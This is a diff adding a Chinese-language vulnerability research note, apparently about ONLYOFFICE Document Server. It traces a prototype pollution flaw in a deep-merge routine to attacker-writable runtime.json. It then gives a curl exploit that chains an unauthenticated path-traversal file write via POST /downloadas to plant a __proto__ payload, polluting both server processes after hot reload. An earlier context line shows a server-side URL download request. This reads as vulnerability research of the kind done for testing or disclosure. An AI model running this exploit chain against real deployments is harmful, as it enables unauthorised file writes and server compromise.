@@ -156,3 +156,26 @@ res.set(response.headers); yield pipeline(stream, res);           // ★ 内容+
 ```
 curl -sS 'http://127.0.0.1:8081/downloadfile/0?url=http://127.0.0.1:8000/index.html'
 ```
+
+# PP
+
+- 原型链污染 根因（Common/sources/utils.js:1428）：
+
+```js
+for (const key in source) {                  // ① 枚举 own + 继承
+  if (isObject(source[key])) {
+    if (!target[key]) Object.assign(target, {[key]: {}});   // ② target[key] 走 getter
+    deepMergeObjects(target[key], source[key]);             // ③ 自引用即无限递归
+  } else Object.assign(target, {[key]: source[key]});       // ④ 触发 __proto__ setter
+}
+```
+
+入参就是攻击者可控的 `runtime.json（operationContext.js:114）`，且 DS 启动没有 --disable-proto（全仓无该 flag，supervisor 直接跑 pkg 二进制）⇒ 写 `{"__proto__":{…}}` → 200ms 热加载 → 下次 ctx.initTenantCache() → 全局原型污染，DocService + FileConverter 两进程都中。
+
+- 写原语，这里还是用的上面那个任意读写（POST /downloadas/:docid，server.js:258；免鉴权门 canvasservice.js:1550 if (tenTokenEnableBrowser || tokenDownload || tokenSession)，browser=false ⇒ 跳过；savetype=3 跳过 path.basename 净化；落盘 storage-fs.js:44 path.join(folderPath, strPath) 无穿越校验）
+
+```bash
+curl -sS -X POST 'http:/127.0.0.1:8081/downloadas/pp?cmd=%7B%22c%22%3A%22save%22%2C%22id%22%3A%22.%22%2C%22savekey%22%3A%22.%22%2C%22savetype%22%3A3%2C%22format%22%3A%22/../../../../../../../../../../../../var/www/onlyoffice/Data/runtime.json%22%7D' \
+  -H 'Content-Type: text/plain' \
+  --data-binary '{"__proto__":{"customProviders":[{"name":"OO_PP_PROBE","type":"probe"}]}}'
+```
